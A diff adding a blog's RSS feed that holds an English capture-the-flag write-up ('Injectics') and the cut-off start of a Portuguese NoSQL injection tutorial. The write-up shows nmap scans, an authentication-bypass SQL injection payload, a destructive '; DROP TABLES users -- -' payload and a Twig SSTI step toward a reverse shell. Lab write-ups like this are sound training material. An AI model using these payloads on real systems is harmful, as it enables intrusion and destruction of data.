@@ -1,0 +1,447 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Alex Paulino – Sql</title>
+    <link>http://localhost:1313/tags/sql/</link>
+    <description>Recent content in Sql on Alex Paulino</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>pt</language>
+    <lastBuildDate>Tue, 11 Mar 2025 11:41:00 -0300</lastBuildDate>
+    
+	  <atom:link href="http://localhost:1313/tags/sql/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>Injectics</title>
+      <link>http://localhost:1313/posts/2025/2025-03-05-injectics/</link>
+      <pubDate>Tue, 11 Mar 2025 11:41:00 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/2025/2025-03-05-injectics/</guid>
+      <description>
+        
+        
+        &lt;p&gt;A CTF focused on injection and enumeration attacks, where we first identify the field vulnerable to &lt;code&gt;SQL injection&lt;/code&gt;. After that, we must use obfuscation techniques to bypass the verification of &lt;code&gt;special characters&lt;/code&gt;. Once access is obtained, we need to understand the behavior of the update feature to carry out a &lt;code&gt;second-order SQL&lt;/code&gt; attack, thereby deleting the table and triggering the default credentials registration. In the administrative panel, we should analyze which &lt;code&gt;server template&lt;/code&gt; is in use to perform the SSTI attack.&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;recon&#34;&gt;Recon&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;recon&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#recon&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First, scan TCP SYN with the Nmap tool.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿estudos&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/alex&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# nmap -Pn -sS --open  10.10.131.224 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-03-07 18:33 -03
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.131.224
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.36s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;991&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; filtered tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 5.98 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿estudos&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/alex&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# nmap -Pn -sS --open  -p- 10.10.131.224
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-03-07 18:33 -03
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.131.224
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.32s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65456&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; filtered tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 100.55 seconds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Comment on the source code&amp;rsquo;s home page.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- Website developed by John Tim - dev@injectics.thm--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;With the &lt;code&gt;ffuf&lt;/code&gt; tool, we discover directories.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-ffuf-initial.png&#34; alt=&#34;injectics-ctf-ffuf-initial&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;In the &lt;strong&gt;vendor&lt;/strong&gt; directory, we discover the &lt;code&gt;twig&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-ffuf-vendor.png&#34; alt=&#34;injectics-ctf-ffuf-vendor&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Directories discovers in the &lt;code&gt;phpmyadmin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-ffuf-phpmyadmin.png&#34; alt=&#34;injectics-ctf-ffuf-phpmyadmin&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;On the login page, there is an option to log in as admin.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;.../login.php
+.../adminLogin007.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The behavior of the two pages when authentication fails is the same.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-login-authentication.png&#34; alt=&#34;injectics-ctf-login-authentication&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Special character (&lt;code&gt;&#39;&lt;/code&gt;) is detected in &lt;code&gt;login.php&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-apostrophe.png&#34; alt=&#34;injectics-ctf-apostrophe&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;In the file &lt;code&gt;script.js&lt;/code&gt;, we saw how authentication works and the keywords are detected.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-sourcecode-keywords.png&#34; alt=&#34;injectics-ctf-sourcecode-keywords&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Back on the source&amp;rsquo;s homepage, there&amp;rsquo;s another comment about the file named &lt;code&gt;mail.log&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-maillog.png&#34; alt=&#34;injectics-ctf-maillog&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;quot;automatically insert default credentials into the &amp;quot;users&amp;quot; table if it is ever deleted...&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;exploring&#34;&gt;Exploring&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;exploring&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#exploring&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;For authentication bypass, we should first use URL encoding to prevent the detection of our special characters.&lt;/p&gt;
+&lt;p&gt;Wordlist to perform an SQL injection:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;That payload was successful: &lt;code&gt;&#39; OR &#39;x&#39;=&#39;x&#39;#;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-burp-bypass.png&#34; alt=&#34;injectics-ctf-burp-bypass&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Access obtained.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-leaderboards.png&#34; alt=&#34;injectics-ctf-leaderboards&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;We can update the leaderboards of medals. When we insert an apostrophe &lt;code&gt;&#39;&lt;/code&gt;, we encounter an error: &lt;code&gt;Error updating data.&lt;/code&gt; To use the apostrophe, we should convert it to URL encode &lt;code&gt;%27&lt;/code&gt;. If we use a semicolon &lt;code&gt;;&lt;/code&gt; right after updating, we will update the number of gold medals for all countries.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-leaderboards.png&#34; alt=&#34;injectics-ctf-update-leaderboard&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-update-medals.png&#34; alt=&#34;injectics-ctf-update-medals&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;obtaining-administrative-access&#34;&gt;Obtaining Administrative Access&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;obtaining-administrative-access&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#obtaining-administrative-access&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The SQL update statement is likely written as follows.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;UPDATE Leaderboard SET gold=10; WHERE country = &#39;USA&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;When we insert a semicolon, we ignore the &lt;code&gt;WHERE&lt;/code&gt; clause, thus updating all the other countries.&lt;/p&gt;
+&lt;p&gt;We will use &lt;code&gt;; DROP TABLES users -- -&lt;/code&gt; to delete the table and create the default credentials for the &lt;code&gt;mail.log&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-droptable.png&#34; alt=&#34;injectics-ctf-droptable&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;On the &lt;code&gt;Login as Admin&lt;/code&gt; page, we log in using the administrator credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-panel-admin.png&#34; alt=&#34;injectics-ctf-panel-admin&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;cve-2022-23614&#34;&gt;CVE-2022-23614&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cve-2022-23614&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cve-2022-23614&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We can update certain user data in &lt;code&gt;Update Profile&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-update-profile.png&#34; alt=&#34;injectics-ctf-update-profile&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The changed &lt;code&gt;first name&lt;/code&gt; is displayed in &lt;code&gt;dashboard.php&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-panel-name-update.png&#34; alt=&#34;injectics-ctf-panel-name-update&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;We know that there is a &lt;code&gt;Twig&lt;/code&gt; server template on the server. We still don&amp;rsquo;t know its version, so we will search for &lt;code&gt;JSON&lt;/code&gt; files.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-ffuf-composer.png&#34; alt=&#34;injectics-ctf-ffuf-composer&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-twig-version.png&#34; alt=&#34;injectics-ctf-twig-version&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Flow of the SSTI test.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-flow-ssti.png&#34; alt=&#34;injectics-ctf-flow-ssti&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Testing an SSTI attack on the name field.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-attack-ssti.png&#34; alt=&#34;injectics-ctf-attack-ssti&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The application is vulnerable to SSTI attacks.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-49.png&#34; alt=&#34;injectics-ctf-49&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;While researching on the internet, I found a proof of concept for this vulnerability.&lt;/p&gt;
+&lt;p&gt;PoC: &lt;code&gt;https://github.com/4rtamis/CVE-2022-23614&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The payload executes successfully.&lt;/p&gt;
+&lt;p&gt;I took some time to figure out how to use the &lt;code&gt;sort&lt;/code&gt; filter to display the command output. I found the link above and decided to test &lt;code&gt;passthru&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;{: .prompt-info }&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;passthru() is a function used to execute an external command and display its raw output directly to the browser or terminal, often without buffering. It&amp;rsquo;s commonly used for executing system-level commands.&lt;/p&gt;
+
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-id.png&#34; alt=&#34;injectics-ctf-id&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The payload was executed successfully. Now we can prepare our command to obtain a reverse shell.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-reverse.png&#34; alt=&#34;injectics-ctf-reverse&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The reverse shell was obtained. We can retrieve the last flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/injectics/injectics-ctf-flag.png&#34; alt=&#34;injectics-ctf-flag&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>NoSQL - Injection</title>
+      <link>http://localhost:1313/posts/2025/2025-03-06-nosql-injection/</link>
+      <pubDate>Thu, 06 Mar 2025 21:50:00 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/2025/2025-03-06-nosql-injection/</guid>
+      <description>
+        
+        
+        &lt;h2 data-hextra-search-id=&#34;nosql&#34;&gt;NoSQL&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;nosql&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#nosql&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As informações não são armazenadas em &lt;code&gt;tabelas&lt;/code&gt;mas sim em &lt;code&gt;documentos&lt;/code&gt;.
+Exemplo de banco de dados em &lt;strong&gt;NoSQL&lt;/strong&gt;: MongoDB.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;mongodb&#34;&gt;MongoDB&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;mongodb&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#mongodb&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Em um banco de dados NoSQL os valores são salvos em pares: &lt;code&gt;chave-valor&lt;/code&gt;, por exemplo, um banco de dados do departamento de RH.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;{&amp;quot;_id&amp;quot; : ObjectId(&amp;quot;5f077332de2cdf808d26cd74&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;lphillips&amp;quot;, &amp;quot;first_name&amp;quot; : &amp;quot;Logan&amp;quot;, &amp;quot;last_name&amp;quot; : &amp;quot;Phillips&amp;quot;, &amp;quot;age&amp;quot; : &amp;quot;65&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;lphillips@example.com&amp;quot; }&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Esses são os &lt;code&gt;documentos&lt;/code&gt;, armazenado em uma matriz associativa com um número arbitrário de campos.
+Esses &lt;code&gt;documentos&lt;/code&gt;são estruturados em uma hierarquia superior, chamada de &lt;code&gt;coleções&lt;/code&gt;, essas por sua vez são equivalentes as &lt;code&gt;tabelas&lt;/code&gt; que temos em um banco de dados relacional.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-collections.png&#34; alt=&#34;Collections&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;As &lt;code&gt;coleçoes&lt;/code&gt;são agrupadas em um banco de dados.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-database.png&#34; alt=&#34;Databases&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;consultando-banco-de-dados&#34;&gt;Consultando banco de dados&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;consultando-banco-de-dados&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#consultando-banco-de-dados&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A consulta é realizada em &lt;code&gt;chave-valor&lt;/code&gt; nos documentos, por exemplo.&lt;/p&gt;
+&lt;p&gt;![key-value](/assets/img/posts/2025/03/nosql-injection/nosql-pairs.png&lt;/p&gt;
+&lt;p&gt;Pesquisando somente por &lt;code&gt;last_name&lt;/code&gt;:
+&lt;code&gt;[&#39;last_name&#39; =&amp;gt; &#39;Sandler&#39;]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Realizando duas condição (&lt;code&gt;and&lt;/code&gt;):
